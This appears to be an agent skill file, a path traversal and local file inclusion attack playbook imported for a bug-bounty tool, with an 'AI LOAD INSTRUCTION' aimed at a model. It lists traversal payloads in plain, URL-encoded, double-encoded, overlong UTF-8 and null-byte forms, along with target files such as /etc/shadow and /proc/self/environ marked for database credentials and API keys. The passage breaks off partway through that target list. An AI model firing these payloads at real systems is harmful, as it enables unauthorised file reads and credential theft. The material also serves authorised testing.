---
name: path-traversal-lfi
description: Path traversal and LFI playbook. Use when file paths, download endpoints, include operations, archive extraction, or wrapper behavior may expose filesystem control.
scope: web2
---
Path traversal and LFI playbook. Use when file paths, download endpoints, include operations, archive extraction, or wrapper behavior may expose filesystem control.

# SKILL: Path Traversal / Local File Inclusion (LFI) — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert path traversal and LFI techniques. Covers encoding bypass sequences, OS differences, filter bypass, PHP wrapper exploitation, log poisoning to RCE, and the critical distinction between path traversal (read only) vs LFI (execution). Base models miss encoding chains and RCE escalation paths.


## 1. CORE CONCEPT

**Path Traversal**: Read arbitrary files by escaping the intended directory with ../ sequences.
**LFI**: In PHP, when user input controls include()/require() — file is **executed** as PHP code, not just read.

http://target.com/index.php?page=home
→ Opens: /var/www/html/pages/home.php

Traversal attack:
http://target.com/index.php?page=../../../../etc/passwd
→ Opens: /etc/passwd

---

## 2. TRAVERSAL SEQUENCE VARIANTS

The filtering strategy determines which encoding to use:

### Basic
../../../etc/passwd
..\..\..\windows\system32\drivers\etc\hosts  (Windows)

### URL Encoding
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd     ← %2f = '/'
%2e%2e%5c%2e%2e%5c%2e%2e%5c                  ← %5c = '\'

### Double URL Encoding (when server decodes once, filter checks before decode)
%252e%252e%252f%252e%252e%252f  ← %25 = %, double-encoded %2e
..%252f..%252fetc%252fpasswd

### Unicode / Overlong UTF-8
..%c0%af..%c0%af     ← overlong UTF-8 encoding of '/'
..%c1%9c..%c1%9c     ← overlong UTF-8 encoding of '\'
..%ef%bc%8f          ← fullwidth solidus '／'

### Mixed Encodings
..%2F..%2Fetc%2Fpasswd
....//....//etc/passwd   ← double-dot with slash (filter strips single ../)

### Filter Strips ../ (so ../ becomes ../ after strip)
....//          ← becomes ../ after filter strips ../
..././          ← becomes ../ after filter strips ./

### Null Byte Injection (legacy PHP < 5.3.4)
../../../../etc/passwd%00.jpg   ← %00 truncates string, strips .jpg extension
../../../../etc/passwd%00.php

---

## 3. TARGET FILES AND ESCALATION TARGETS

### Linux
/etc/passwd                  ← user list (usernames, UIDs)
/etc/shadow                  ← password hashes (requires root-level file read)
/etc/hosts                   ← internal hostnames → pivot targets
/etc/hostname                ← server hostname
/proc/self/environ           ← process environment (DB creds, API keys!)
/proc/self/cmdline           ← proce
...

## References
- Source: https://github.com/yaklang/hack-skills/blob/main/skills/path-traversal-lfi/SKILL.md
- License: MIT — Copyright (c) 2026 VillanCh
- Distilled for bbhunter by scripts/import_hack_skills.py
